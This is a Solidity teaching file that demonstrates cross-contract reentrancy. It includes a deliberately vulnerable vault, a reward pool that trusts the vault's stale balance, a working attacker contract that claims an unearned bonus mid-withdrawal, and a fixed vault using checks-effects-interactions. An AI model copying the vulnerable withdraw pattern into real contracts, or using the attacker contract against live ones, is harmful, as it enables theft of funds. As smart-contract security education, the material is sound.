// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/* ===========================================================================
   VARIANT 3 — CROSS-CONTRACT REENTRANCY
   ---------------------------------------------------------------------------
   Two contracts share state: the Vault holds balances, and a separate
   RewardPool pays a one-time bonus to anyone whose Vault balance is >= a
   threshold. The Vault's withdraw() is not CEI, so during its callback the
   Vault still reports the OLD balance. The attacker re-enters the OTHER
   contract (RewardPool) and claims a bonus it does not deserve.

   A reentrancy guard on the Vault would NOT help — the re-entry lands in a
   different contract. The real fix is CEI on the Vault so its state is
   already updated when RewardPool reads it.

   
     1. Deploy VulnerableRewardVault. Deploy RewardPool(vault) and fund it with 2 ETH.
     2. Deploy CrossContractAttacker(vault, reward).
     3. attacker.attack() with 1 ETH.
     4. Show attacker received 1 ETH (withdraw) + 0.5 ETH (bonus) = 1.5 ETH.
     5. Repeat with SafeRewardVault -> RewardPool sees balance 0 during the callback,
        the bonus claim fails, attacker only gets its 1 ETH back.
   =========================================================================== */

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function balanceOf(address who) external view returns (uint256);
}

/* ----------------------------- VULNERABLE -------------------------------- */
contract VulnerableRewardVault is IVault {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // BUG: external call before the balance is cleared -> stale state exposed.
    function withdraw() external {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "nothing to withdraw");
        (bool ok, ) = msg.sender.call{value: amount}("");   // callback happens here
        require(ok, "send failed");
        balanceOf[msg.sender] = 0;
    }
}

/* --------------------------- SECOND CONTRACT ----------------------------- */
contract RewardPool {
    IVault public immutable vault;
    mapping(address => bool) public claimed;

    uint256 public constant THRESHOLD = 1 ether;
    uint256 public constant BONUS = 0.5 ether;

    constructor(address vaultAddress) {
        vault = IVault(vaultAddress);
    }

    receive() external payable {} // fund the reward pool

    // Trusts the Vault's live balance — which is stale mid-withdrawal.
    function claim() external {
        require(!claimed[msg.sender], "already claimed");
        require(vault.balanceOf(msg.sender) >= THRESHOLD, "need vault balance");
        claimed[msg.sender] = true;
        (bool ok, ) = msg.sender.call{value: BONUS}("");
        require(ok, "bonus send failed");
    }
}

/* ------------------------------ ATTACKER --------------------------------- */
contract CrossContractAttacker {
    IVault public immutable vault;
    RewardPool public immutable reward;
    bool private done;

    constructor(address vaultAddress, address rewardAddress) {
        vault = IVault(vaultAddress);
        reward = RewardPool(payable(rewardAddress));
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "seed with >= 1 ETH");
        vault.deposit{value: msg.value}();
        vault.withdraw();            // callback -> claim() while balance is stale
    }

    receive() external payable {
        if (!done) {
            done = true;
            // Ignore failure so the withdrawal still completes in the SAFE case.
            (bool ok, ) = address(reward).call(abi.encodeWithSignature("claim()"));
            if (!ok) { /* SAFE version: claim denied — ignored for this PoC */ }
        }
    }

    function sweep(address to) external {
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}

/* ------------------------------- SAFE ------------------------------------ */
// CEI: the balance is zeroed BEFORE the external call, so RewardPool.claim()
// reads 0 during the callback and the bonus is correctly denied.
contract SafeRewardVault is IVault {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "nothing to withdraw");
        balanceOf[msg.sender] = 0;                          // EFFECT first
        (bool ok, ) = msg.sender.call{value: amount}("");   // INTERACTION last
        require(ok, "send failed");
    }
}
